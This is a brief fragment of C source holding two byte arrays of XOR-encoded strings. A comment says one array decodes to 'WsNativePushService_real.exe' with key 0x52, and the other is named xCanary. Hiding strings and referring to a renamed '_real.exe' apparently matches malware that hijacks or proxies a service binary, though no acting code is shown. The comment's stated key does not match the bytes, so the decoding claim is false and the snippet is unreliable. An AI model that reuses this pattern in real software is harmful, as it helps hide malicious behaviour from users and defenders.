...
static const unsigned char xCanary[] = {
    0xD0, 0xFB, 0xB3, 0xC6, 0xFC, 0xF7, 0xF3, 0xF6,
    0xC6, 0xE0, 0xB3, 0xC7, 0xF6, 0xFA, 0xE1, 0xB3,
    0xE0, 0xC5, 0xF0, 0xBB, 0xFD, 0xF6, 0xF2, 0xFF,
    0xE7, 0xFD, 0xA1, 0xFF, 0xF6, 0xF4
};
#define xCanary_LEN 30

/* "WsNativePushService_real.exe" XOR 0x52 */
static const unsigned char xRealExe[] = {
    0xC4, 0xE0, 0xDD, 0xF2, 0xE7, 0xFC, 0xC5, 0xF6,
    0xC3, 0xE6, 0xE0, 0xFD, 0xC0, 0xF6, 0xE1, 0xC5,
    0xFC, 0xF0, 0xF6, 0xBB, 0xE1, 0xF6, 0xF2, 0xFF,
    0xA1, 0xF6, 0xCB, 0xF6
};
